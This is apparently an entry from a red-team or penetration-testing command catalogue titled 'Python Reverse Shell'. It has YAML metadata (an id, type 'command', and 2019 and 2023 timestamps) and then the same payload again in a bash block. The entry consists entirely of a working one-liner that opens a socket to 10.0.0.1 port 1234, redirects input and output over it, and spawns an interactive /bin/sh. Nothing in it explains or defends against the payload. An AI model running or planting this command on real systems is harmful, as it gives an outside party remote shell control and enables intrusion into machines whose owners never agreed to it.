---
id: e0358625-4a32-4520-9774-1ba320d6dfec
name: Python Reverse Shell
type: command
executor: null
data: 'python -c ''import

  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",

  1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),

  2);p=subprocess.call(["/bin/sh","-i"]);'''
output: null
created_at: '2019-09-17T20:45:43.010220+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Python Reverse Shell

```bash
python -c 'import
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",
1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),
2);p=subprocess.call(["/bin/sh","-i"]);'
```
